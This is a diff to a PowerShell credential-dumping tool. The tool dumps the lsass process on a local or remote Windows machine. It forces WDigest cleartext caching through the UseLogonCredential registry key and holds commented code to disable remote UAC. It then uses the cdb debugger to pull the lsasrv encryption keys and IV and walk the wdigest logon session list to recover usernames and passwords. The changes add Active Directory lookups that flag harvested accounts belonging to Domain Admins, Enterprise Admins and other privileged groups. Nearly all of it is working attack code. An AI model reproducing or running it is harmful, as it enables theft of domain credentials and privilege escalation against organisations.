@@ -47,15 +47,14 @@ $scriptFile = $MyInvocation.MyCommand.Definition
 $launchDate = get-date -f "yyyyMMddHHmmss"
 $logDirectoryPath = $scriptPath + "\" + $launchDate
 $file = "$logDirectoryPath\lsass.dmp"
-$DebuggingScript = "$scriptPath\bufferCommand.txt"
+#$DebuggingScript = "$scriptPath\bufferCommand.txt"
 $pythonProgramPath = "$scriptPath\lsacollectbytes.py"
 
 $loggingFunctions = "$scriptPath\logging\Logging.ps1"
 
-$fullScriptPath = (Resolve-Path -Path $DebuggingScript).Path
+#$fullScriptPath = (Resolve-Path -Path $DebuggingScript).Path
 
-#Dot Source required Function Libraries
-. $loggingFunctions
+#Import-Module activedirectory 
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
@@ -71,11 +70,115 @@ $logFileName = "Log_" + $launchDate + ".log"
 $logPathName = "$logDirectoryPath\$logFileName"
 
 $global:streamWriter = New-Object System.IO.StreamWriter $logPathName
-<#
-$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::getCurrentDomain().Name 
-$currentDomain = Get-DistinguishedNameFromFQDN $currentDomain
-#>
+
 #-----------------------------------------------------------[Functions]------------------------------------------------------------
+
+Function Start-Log{
+<#
+.SYNOPSIS
+These functions allow logging of scripts
+
+.DESCRIPTION
+Create a log file
+
+.PARAMETER scriptName [mandatory]
+Example: Test-log
+      
+.PARAMETER scriptVersion [mandatory]
+Example: 1.0
+
+.PARAMETER streamWriter [mandatory]
+Stream Writer object (New-Object System.IO.StreamWriter)
+This object is use to avoid open and close of the file cause
+by call to Add-Content or Out-File
+        
+#>
+    
+    [CmdletBinding()]  
+    Param ([Parameter(Mandatory=$true)][string]$scriptName, [Parameter(Mandatory=$true)][string]$scriptVersion, 
+        [Parameter(Mandatory=$true)][string]$streamWriter)
+    Process{                  
+        $global:streamWriter.WriteLine("================================================================================================")
+        $global:streamWriter.WriteLine("[$ScriptName] version [$ScriptVersion] started at $([DateTime]::Now)")
+        $global:streamWriter.WriteLine("================================================================================================`n")       
+    }
+}
+ 
+Function Write-Log{
+<#
+.SYNOPSIS
+Write log lines
+
+.DESCRIPTION
+This function allow to append a new line at the end of the log file
+  
+.PARAMETER streamWriter [mandatory]
+Stream Writer object
+  
+.PARAMETER infoToLog [mandatory]
+The information line you want to write in the log file
+#>
+  
+    [CmdletBinding()]  
+    Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$infoToLog)  
+    Process{    
+        $global:streamWriter.WriteLine("$infoToLog")
+    }
+}
+ 
+Function Write-Error{
+<#
+.SYNOPSIS
+Write the error caught you send to this function
+
+.DESCRIPTION
+This function allow to append the error passed at the end of the log file
+  
+.PARAMETER streamWriter [mandatory]
+Stream Writer object
+  
+.PARAMETER error [mandatory]
+The error you want to log
+  
+.PARAMETER forceExit [mandatory]
+Boolean value to force call to End-Log in case of force exit
+--> set to true to force the script Exit 
+#>
+  
+    [CmdletBinding()]  
+    Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$errorCaught, [Parameter(Mandatory=$true)][boolean]$forceExit)  
+    Process{
+        $global:streamWriter.WriteLine("Error: [$errorCaught]")        
+        if ($forceExit -eq $true){
+            End-Log -streamWriter $global:streamWriter
+            break;
+        }
+    }
+}
+ 
+Function End-Log{
+<#
+.SYNOPSIS
+End of execution
+
+.DESCRIPTION
+Write date time of script ended
+  
+.PARAMETER logPathName [mandatory]
+Stream Writer object
+
+#>
+  
+    [CmdletBinding()]  
+    Param ([Parameter(Mandatory=$true)][string]$streamWriter)  
+    Process{    
+        $global:streamWriter.WriteLine("`n================================================================================================")
+        $global:streamWriter.WriteLine("Script ended at $([DateTime]::Now)")
+        $global:streamWriter.WriteLine("================================================================================================")
+  
+        $global:streamWriter.Close()   
+    }
+}
 
 function Set-RegistryKey($computername, $parentKey, $nameRegistryKey, $valueRegistryKey) {
     try{    
@@ -551,6 +654,28 @@ function Stop-Script () {
 
 #----------------------------------------------------------[Execution]----------------------------------------------------------
 Start-Log -scriptName $scriptName -scriptVersion $scriptVersion -streamWriter $global:streamWriter
+
+if ((gwmi win32_computersystem).partofdomain -eq $true) {
+    $enterpriseAdminsGroup = "Enterprise Admins"
+    $schemaAdminsGroup = "Schema Admins"
+    $domainAdminsGroup = "Domain Admins"
+    $administratorsGroup = " Administrators"
+    $backupOperatorsGroup = "Backup Operators"    
+    $enterpriseAdmins = ""
+    $schemaAdmins = ""
+    $domainAdmins = ""
+    $administrators = ""
+    $backupOperators = ""
+    try {$enterpriseAdmins = (Get-ADGroupMember $enterpriseAdminsGroup -Recursive).DistinguishedName}catch{}
+    try {$schemaAdmins = (Get-ADGroupMember $schemaAdminsGroup -Recursive).DistinguishedName}catch{}
+    try {$domainAdmins = (Get-ADGroupMember $domainAdminsGroup -Recursive).DistinguishedName}catch{}
+    try {$administrators = (Get-ADGroupMember $administratorsGroup -Recursive).DistinguishedName}catch{}
+    try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}            
+    
+} else {
+    # workgroup
+}
+
 <#
 $parentKey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 $nameRegistryKey = "LocalAccountTokenFilterPolicy"
@@ -558,7 +683,6 @@ $valueRegistryKey = "1"
 
 Set-RegistryKey $Server $parentKey $nameRegistryKey $valueRegistryKey)
 #>
-
 Write-Host -object (("1*0½1*1½1*3½1*0½1*1½1*1½1*3½1*1½*1½1*2½1*3½1*1½1*1½1*1½1*9½1*10½1*11½1*11½1*10½1*12½1*1½1*13½1*14½1*15½1*1½1*12½1*14½1*16½1*13½1*15½1*1½1*17½1*18½1*19½1*19½1*16½1*13½1*1½1*20½1*21½1*22½1*0½1*1½1*1½0*1½1*5½1*1½1*7½1*1½1*1½1*1½1*1½1*1½1*1½1*1½1*23½1*18½1*27½1*24½1*18½1*15½1*25½1*15½1*26½1*8½1*28½1*29½1*18½1*16½1*11½1*6½1*30½1*10½1*29½1*0½1*6½1*5½1*1½1*8½1*1½1*7½1*6½1*1½1*0"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99"-split "T")[$matches[2]])"*$matches[1]}})-separator ""
 $remoteLocalFile = Read-Host 'Local computer, Remote computer or from a dump file ? (local, remote, dump)'
 switch ($remoteLocalFile){
@@ -653,18 +777,18 @@ __________________________________________________________________________#>
         $nameRegistryKey = "UseLogonCredential"
         $valueRegistryKey = "1"
 
-        $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $strMachineName)
+        $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
         $objRegKey= $objReg.OpenSubKey($parentKey)
         $test = $objRegkey.GetValue($nameRegistryKey)
         if($test -eq $null){    
             Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
-            Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
             Stop-Script
         }
         else {
             if($test -ne 1){
                 Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
-                Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
+                Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
                 Stop-Script
             }
         }
@@ -695,7 +819,10 @@ __________________________________________________________________________#>
 Write-Progress -Activity "Setting environment" -status "Running..." -id 1
 Set-SymbolServer -CacheDirectory C:\symbols\public -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
 Write-Progress -Activity "Environment setted" -status "Running..." -id 1
-
+<#
+$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::getCurrentDomain().Name 
+$currentDomain = Get-DistinguishedNameFromFQDN $currentDomain
+#>
 <#________________________________________________________________________
     Dump lsass
     if gen option used --> dump locally
@@ -719,21 +846,26 @@ if($dump -eq "gen"){
 else {
     if($dump -eq ""){
     $computername = $Server
-    <#  # To disable UAC remote (need a reboot)
-        $parentKey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+      # To disable UAC remote (need a reboot)
+      <#
+        $parentKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
         $nameRegistryKey = "LocalAccountTokenFilterPolicy"
         $valueRegistryKey = "1"
-        $typeRegistryKey = ""
-        $computername = $Server
-        $computername
-        try{    
-            $remoteBaseKeyObject = [microsoft.win32.registrykey]::OpenRemoteBaseKey('LocalMachine',$computername)     
-            $regKey = $remoteBaseKeyObject.OpenSubKey($parentKey,$true)
-            $regKey.Setvalue("$nameRegistryKey", "$valueRegistryKey", [Microsoft.Win32.RegistryValueKind]::DWORD) 
-            $remoteBaseKeyObject.close()
+
+        $objReg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $server)
+        $objRegKey= $objReg.OpenSubKey($parentKey)
+        $test = $objRegkey.GetValue($nameRegistryKey)
+        if($test -eq $null){    
+            Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
+            Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
+            Stop-Script
         }
-        catch {
-            $_.Exception
+        else {
+            if($test -ne 1){
+                Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey     
+                Write-Host "Registry key setted, you have to reboot the remote computer" -foregroundcolor "magenta"
+                Stop-Script
+            }
         }
         #>
         Copy-Item -Path "$scriptPath\dp.exe" -Destination "\\$computername\c$\windows\temp\dp.exe"
@@ -756,39 +888,34 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         Get the triple DES key in the lsass dump memory file
     __________________________________________________________________________#> 
     Write-Progress -Activity "Getting Triple DES Key" -status "Running..." -id 1
-    $h3DesKeyCommand = "dd lsasrv!h3DesKey"
-    [io.file]::WriteAllText($DebuggingScript, $h3DesKeyCommand) | Out-Null   
+    $h3DesKeyCommand = "dd lsasrv!h3DesKey"    
 
-    $h3 = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
-     
-    $arrayFirstAddress = ($h3 -split ' ')    
-    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
+    $h3 = &$CdbProgramPath -z $file -c "$h3DesKeyCommand;Q"     
+    $arrayFirstAddress = ($h3 -split ' ')            
+    $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 4
     $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
-    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
+    $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 5
     $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
-    $firstAddress = "$firstAddress2$firstAddress1"
-    
-    [io.file]::WriteAllText($DebuggingScript,"dd $firstAddress") | Out-Null    
+    $firstAddress = "$firstAddress2$firstAddress1"        
 
-    $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+    $ddSecond = &$CdbProgramPath -z $file -c "dd $firstAddress;Q" 
     
     $arraySecondAddress = ($ddSecond -split ' ')     
     if($mode -eq 132) { 
         $start = 20
-        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 7
+        $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 7
         $secondAddress1 = $arraySecondAddress[$foundInstruction]      
         $secondAddress = "$secondAddress1"   
     }   
     else {
-        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 10
+        $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 10
         $secondAddress1 = $arraySecondAddress[$foundInstruction]    
-        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 11
+        $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 11
         $secondAddress2 = $arraySecondAddress[$foundInstruction]    
         $secondAddress = "$secondAddress2$secondAddress1"   
     }
-
-    [io.file]::WriteAllText($DebuggingScript,"dw $secondAddress") | Out-Null   
-    $thirdAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                  
+    
+    $thirdAddress = &$CdbProgramPath -z $file -c "dw $secondAddress;Q"                  
     $arrayThirdAddress = ($thirdAddress -split ' ')  
         
     if($mode -eq 1) { $start = 20}
@@ -813,7 +940,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
                 $comma = ", "
             }
         }
-        $foundInstruction = [array]::indexof($arrayThirdAddress,"dw") + $value
+        $foundInstruction = [array]::indexof($arrayThirdAddress,"'dw") + $value
         $keyAddress2 = $arrayThirdAddress[$foundInstruction].Substring(0,2)
         $keyAddress1 = $arrayThirdAddress[$foundInstruction].Substring(2,2)           
         $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"
@@ -825,32 +952,27 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         Get the AES key in the lsass dump memory file
     __________________________________________________________________________#> 
     Write-Progress -Activity "Getting AES Key" -status "Running..." -id 1
-    $hAesKeyCommand = "dd lsasrv!hAesKey"
-    [io.file]::WriteAllText($DebuggingScript, $hAesKeyCommand) | Out-Null   
+    $hAesKeyCommand = "dd lsasrv!hAesKey"    
 
-    $h = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+    $h = &$CdbProgramPath -z $file -c "$hAesKeyCommand;Q" 
      
     $arrayFirstAddress = ($h -split ' ')    
-    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
+    $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 4
     $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
-    $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
+    $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 5
     $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
-    $firstAddress = "$firstAddress2$firstAddress1"
-    
-    [io.file]::WriteAllText($DebuggingScript,"dd $firstAddress") | Out-Null    
+    $firstAddress = "$firstAddress2$firstAddress1"        
 
-    $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+    $ddSecond = &$CdbProgramPath -z $file -c "dd $firstAddress;Q" 
     
     $arraySecondAddress = ($ddSecond -split ' ')        
-    $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 10
+    $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 10
     $secondAddress1 = $arraySecondAddress[$foundInstruction]    
-    $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 11
+    $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 11
     $secondAddress2 = $arraySecondAddress[$foundInstruction]    
-    $secondAddress = "$secondAddress2$secondAddress1"   
+    $secondAddress = "$secondAddress2$secondAddress1"       
 
-    [io.file]::WriteAllText($DebuggingScript,"dw $secondAddress") | Out-Null   
-
-    $thirdAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"              
+    $thirdAddress = &$CdbProgramPath -z $file -c "dw $secondAddress;Q"              
     
     $arrayThirdAddress = ($thirdAddress -split ' ')  
     
@@ -875,7 +997,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
                 $comma = ", "
             }
         }
-        $foundInstruction = [array]::indexof($arrayThirdAddress,"dw") + $value
+        $foundInstruction = [array]::indexof($arrayThirdAddress,"'dw") + $value
         $keyAddress2 = $arrayThirdAddress[$foundInstruction].Substring(0,2)
         $keyAddress1 = $arrayThirdAddress[$foundInstruction].Substring(2,2)           
         $keyAddress += "$comma"+"0x$keyAddress1, 0x$keyAddress2"
@@ -887,10 +1009,9 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         Get the initialization vector in the lsass dump memory file
     __________________________________________________________________________#> 
     Write-Progress -Activity "Getting Initialization Vector" -status "Running..." -id 1
-    $initializationVectorCommand = "db lsasrv!InitializationVector"
-    [io.file]::WriteAllText($DebuggingScript, $initializationVectorCommand) | Out-Null   
+    $initializationVectorCommand = "db lsasrv!InitializationVector"      
 
-    $initializationVector = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+    $initializationVector = &$CdbProgramPath -z $file -c "$initializationVectorCommand;Q" 
     $arrayInitializationVector = ($initializationVector -split ' ')    
     
     if($mode -eq 1 -or $mode -eq 132) { $start = 20}
@@ -908,7 +1029,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
             $value++
             $comma = ", "        
         }
-        $foundInstruction = [array]::indexof($arrayInitializationVector,"db") + $value   
+        $foundInstruction = [array]::indexof($arrayInitializationVector,"'db") + $value   
         if($j -eq 7) {
             $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction].Substring(0,2)
         }
@@ -928,23 +1049,22 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         In l_LogSessList, we can retrieve Login (clear), Domain(clear) and 
         Password (not clear)
     __________________________________________________________________________#> 
-    Write-Progress -Activity "Getting first address of the list" -status "Running..." -id 1
-    [io.file]::WriteAllText($DebuggingScript,'dd wdigest!l_LogSessList') | Out-Null     
+    Write-Progress -Activity "Getting first address of the list" -status "Running..." -id 1    
 
-    $wdigest = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"    
+    $wdigest = &$CdbProgramPath -z $file -c "dd wdigest!l_LogSessList;Q"    
     
     $firstAddress = ""
 
     $arrayFirstAddress = ($wdigest -split ' ')    
     if($mode -eq 132) {
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 4
         $firstAddress1 = $arrayFirstAddress[$foundInstruction]
         $firstAddress = "$firstAddress1" 
     }
     else {
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 4
         $firstAddress1 = $arrayFirstAddress[$foundInstruction]
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 5
         $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
         $firstAddress = "$firstAddress2$firstAddress1" 
     }
@@ -957,28 +1077,28 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
     $i = 0
     while ($firstAddressList -ne $nextEntry <#-and $i -le 2#>) {
         if($i -eq 0) {
-            $nextEntry = $firstAddress
-            [io.file]::WriteAllText($DebuggingScript,"dd $firstAddress") | Out-Null    
+            $nextEntry = $firstAddress            
+            $command = "dd $firstAddress"
         }
-        else {
-            [io.file]::WriteAllText($DebuggingScript,"dd $nextEntry") | Out-Null    
+        else {            
+            $command = "dd $nextEntry"
         }
 
-        $ddSecond = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+        $ddSecond = &$CdbProgramPath -z $file -c "$command;Q" 
 
         # Next entry in the list
         if($mode -eq 132) {
             if($i -eq 0) {
                 $firstAddress = $firstAddress               
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 4
                 $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]        
                 $nextEntry = "$nextEntry1"                   
             }
             else {        
                 $firstAddress = $nextEntry
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 4
                 $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]         
                 $nextEntry = "$nextEntry1"                
             }   
@@ -987,18 +1107,18 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
             if($i -eq 0) {
                 $firstAddress = $firstAddress               
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 4
                 $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 5
                 $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                 $nextEntry = "$nextEntry2$nextEntry1"                   
             }
             else {        
                 $firstAddress = $nextEntry
                 $arrayNextEntryAddress = ($ddSecond -split ' ')    
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 4
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 4
                 $nextEntry1 = $arrayNextEntryAddress[$foundInstruction]     
-                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"dd") + 5
+                $foundInstruction = [array]::indexof($arrayNextEntryAddress,"'dd") + 5
                 $nextEntry2 = $arrayNextEntryAddress[$foundInstruction]    
                 $nextEntry = "$nextEntry2$nextEntry1"                
             } 
@@ -1013,33 +1133,52 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         if($mode -eq 132) { $start = 17}
         if($mode -eq 2 -or $mode -eq "2r2") { $start = 24}
          
-        $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start
+        $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start
         $loginAddress1 = $arrayLoginAddress[$foundInstruction] 
-        $foundInstruction = [array]::indexof($arrayLoginAddress,"dd") + $start + 1
+        $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start + 1
         $loginAddress2 = $arrayLoginAddress[$foundInstruction]    
         $loginAddress = "$loginAddress2$loginAddress1"                            
-        
-        [io.file]::WriteAllText($DebuggingScript,"du $loginAddress") | Out-Null   
+                
 
-        $loginDB = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"   
+        $loginDB = &$CdbProgramPath -z $file -c "du $loginAddress;Q"   
         $arrayloginDBAddress = ($loginDB -split ' ')    
         
-        $foundInstruction = [array]::indexof($arrayloginDBAddress,"du") + 4
+        $foundInstruction = [array]::indexof($arrayloginDBAddress,"'du") + 4
         $loginPlainText1 = $arrayloginDBAddress[$foundInstruction]
 
-        $loginPlainText = $loginPlainText1        
-
-        #$user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText} -SearchBase $currentDomain -Properties *;
-        #$GroupMembership = ($user.memberof | % { (Get-ADGroup $_).Name; }) -join ';';        
-
-        $loginPlainText = $loginPlainText #+ $GroupMembership
-
+        $loginPlainText = $loginPlainText1 -replace """",""                             
+        if ((gwmi win32_computersystem).partofdomain -eq $true) {
+            $user = ""
+            $user = Get-ADUser -Filter "UserPrincipalName -like '$loginPlainText'"             
+            if($user -ne $null) {
+                $user = $user.DistinguishedName   
+                $enterpriseAdminsFlag = "false"
+                $schemaAdminsFlag = "false"
+                $domainAdminFlag = "false"
+                $administratorsFlag = "false"
+                $backupOperatorsFlag = "false"
+                if($enterpriseAdmins -ne ""){
+                    $enterpriseAdminsFlag = $enterpriseAdmins.Contains($user)
+                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
+                }
+                if($schemaAdmins -ne ""){
+                    $schemaAdminsFlag = $schemaAdmins.Contains($user)
+                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
+                }
+                $domainAdminFlag = $domainAdmins.Contains($user)
+                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
+                $administratorsFlag = $administrators.Contains($user)
+                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
+                $backupOperatorsFlag = $backupOperators.Contains($user)
+                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
+            }
+        }
         # Password
         Write-Progress -Activity "Getting password information" -status "Running..." -id 1         
         $arraySecondAddress = ($ddSecond -split ' ')    
         if($mode -eq 132) { $start = 22}
         else {$start = 34}
-        $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + $start
+        $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + $start
         $lengthPassword = $arraySecondAddress[$foundInstruction]
         $lengthPassword = $lengthPassword.Substring(6,2)    
         <#
@@ -1054,21 +1193,19 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         $numberBytes = [int][Math]::Ceiling([System.Convert]::ToInt32($lengthPassword,16)/8) * 4    
         
         if($mode -eq 132) {
-            $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 23
+            $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 23
             $secondAddress1 = $arraySecondAddress[$foundInstruction]     
             $secondAddress = "$secondAddress1" 
         }
         else {
-            $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 36
+            $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 36
             $secondAddress1 = $arraySecondAddress[$foundInstruction]  
-            $foundInstruction = [array]::indexof($arraySecondAddress,"dd") + 37
+            $foundInstruction = [array]::indexof($arraySecondAddress,"'dd") + 37
             $secondAddress2 = $arraySecondAddress[$foundInstruction]    
             $secondAddress = "$secondAddress2$secondAddress1"        
         }
-                                  
-        [io.file]::WriteAllText($DebuggingScript,"dw $secondAddress") | Out-Null   
-
-        $passAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"                          
+                                          
+        $passAddress = &$CdbProgramPath -z $file -c "dw $secondAddress;Q"                          
         $arrayPasAddress = ($passAddress -split ' ')          
         
         $passAddress1 = ""
@@ -1094,7 +1231,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
                     $comma = ", "
                 }
             }
-            $foundInstruction = [array]::indexof($arrayPasAddress,"dw") + $value                
+            $foundInstruction = [array]::indexof($arrayPasAddress,"'dw") + $value                
             $passAddress2 = $arrayPasAddress[$foundInstruction].Substring(0,2)
             $passAddress1 = $arrayPasAddress[$foundInstruction].Substring(2,2)            
             $stringPasswordHex += "$comma"+"0x$passAddress1, 0x$passAddress2"
@@ -1121,23 +1258,19 @@ else {
             Get the DES-X key in the lsass dump memory file
         __________________________________________________________________________#> 
         Write-Progress -Activity "Getting DES-X Key" -status "Running..." -id 1
-        $h3DesKeyCommand = "dd lsasrv!g_pDesXKey"
-        [io.file]::WriteAllText($DebuggingScript, $h3DesKeyCommand) | Out-Null   
+        $h3DesKeyCommand = "dd lsasrv!g_pDesXKey"         
 
-        $desX = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+        $desX = &$CdbProgramPath -z $file -c "$h3DesKeyCommand;Q" 
      
         $arrayFirstAddress = ($desX -split ' ')    
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 4
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 4
         $firstAddress1 = $arrayFirstAddress[$foundInstruction]    
-        $foundInstruction = [array]::indexof($arrayFirstAddress,"dd") + 5
+        $foundInstruction = [array]::indexof($arrayFirstAddress,"'dd") + 5
         $firstAddress2 = $arrayFirstAddress[$foundInstruction]    
-        $firstAddress = "$firstAddress2$firstAddress1"
+        $firstAddress = "$firstAddress2$firstAddress1"         
 
-        [io.file]::WriteAllText($DebuggingScript,"dw /c 96 $firstAddress L48") | Out-Null   
-
-        $desXAddress = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q"              
-            
-        $arrayDesXAddressAddress = ($desXAddress -split ' ')                      
+        $desXAddress = &$CdbProgramPath -z $file -c "dw /c 96 $firstAddress L48;Q"                      
+        $arrayDesXAddressAddress = ($desXAddress -split ' ')                              
         $passAddress1 = ""
         $j = 0
         $start = 7
@@ -1151,7 +1284,7 @@ else {
                 $value++
                 $comma = " "                
             }            
-            $foundInstruction = [array]::indexof($arrayDesXAddressAddress,"dw") + $value                        
+            $foundInstruction = [array]::indexof($arrayDesXAddressAddress,"'dw") + $value                        
             $keyAddress2 = $arrayDesXAddressAddress[$foundInstruction].Substring(0,2)                      
             $keyAddress1 = $arrayDesXAddressAddress[$foundInstruction].Substring(2,2)                                  
             $keyAddress += "$keyAddress1$keyAddress2"
@@ -1163,10 +1296,9 @@ else {
         Get the Feedback in the lsass dump memory file
         __________________________________________________________________________#> 
         Write-Progress -Activity "Getting Initialization Vector" -status "Running..." -id 1
-        $initializationVectorCommand = "db lsasrv!g_Feedback"
-        [io.file]::WriteAllText($DebuggingScript, $initializationVectorCommand) | Out-Null   
+        $initializationVectorCommand = "db lsasrv!g_Feedback"          
 
-        $initializationVector = &$CdbProgramPath -z $file -c "`$`$<$fullScriptPath;Q" 
+        $initializationVector = &$CdbProgramPath -z $file -c "$initializationVectorCommand;Q" 
 
         $arrayInitializationVector = ($initializationVector -split ' ')    
 
@@ -1182,7 +1314,7 @@ else {
                 $value++
                 $comma = ", "        
             }
-            $foundInstruction = [array]::indexof($arrayInitializationVector,"db") + $value   
+            $foundInstruction = [array]::indexof($arrayInitializationVector,"'db") + $value   
             if($j -eq 7) {
                 $initializationVectorAddress1 = $arrayInitializationVector[$foundInstruction].Substring(0,2)
             }
@@ -1194,7 +1326,7 @@ else {
         }   
 
         $g_Feedback = $initializationVectorAddress        
-
+        
         $Encoding = [System.Text.Encoding]::GetEncoding("windows-1252")
 
         $hexarray = $g_Feedback -split '(.{2})' | ? {$_}
